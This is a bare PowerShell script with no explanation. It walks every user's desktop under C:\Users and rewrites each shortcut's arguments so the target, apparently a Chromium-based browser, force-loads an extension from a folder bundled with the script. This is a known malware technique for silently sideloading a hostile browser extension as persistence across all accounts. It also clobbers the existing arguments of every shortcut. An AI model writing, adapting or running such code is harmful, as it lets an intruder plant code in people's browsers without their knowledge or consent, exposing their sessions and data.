$wshell = New-Object -ComObject WScript.Shell
$usersFolder = "C:\Users"
$extensionPath = Join-Path $PSScriptRoot "ex"

Get-ChildItem -Path $usersFolder | Where-Object { $_.PSIsContainer } | ForEach-Object {
    $desktopPath = Join-Path $_.FullName "Desktop"
    
    if (Test-Path $desktopPath) {
        Get-ChildItem -Path $desktopPath -Filter *.lnk | ForEach-Object {
            $shortcut = $wshell.CreateShortcut($_.FullName)
            $oldTarget = $shortcut.TargetPath

            if ($oldTarget) {
                $shortcut.TargetPath = $oldTarget
                $shortcut.Arguments = "--load-extension=`"$extensionPath`" --enable-extensions"
                $shortcut.Save()
            }
        }
    }
}
